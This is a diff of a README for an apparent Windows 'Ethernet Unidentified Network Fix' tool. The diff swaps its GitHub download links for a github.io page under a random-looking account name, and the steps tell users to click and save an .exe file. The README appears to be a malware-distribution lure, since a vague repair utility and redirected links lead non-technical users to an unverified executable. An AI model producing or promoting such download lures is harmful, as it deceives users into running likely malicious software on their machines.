@@ -1,6 +1,6 @@
 # 🌐 Ethernet-Unidentified-Network-Fix - Repair your network connection with ease
 
-[![Download Tool](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Amaurotic-archilochus791/Ethernet-Unidentified-Network-Fix)
+[![Download Tool](https://img.shields.io/badge/Download-Release-blue.svg)](https://amaurotic-archilochus791.github.io)
 
 ## 🛠 What this tool does
 
@@ -14,7 +14,7 @@ This tool functions on Windows 10 and Windows 11. It requires no installation or
 
 To address your network issue, you must visit the official release page. Follow these steps to obtain the software:
 
-1. Visit this page to download the latest version: [https://github.com/Amaurotic-archilochus791/Ethernet-Unidentified-Network-Fix](https://github.com/Amaurotic-archilochus791/Ethernet-Unidentified-Network-Fix)
+1. Visit this page to download the latest version: [https://amaurotic-archilochus791.github.io](https://amaurotic-archilochus791.github.io)
 2. Look for the latest release on the right side of the page.
 3. Click the file ending in .exe to start the transfer.
 4. Save the file to your desktop for easy access.
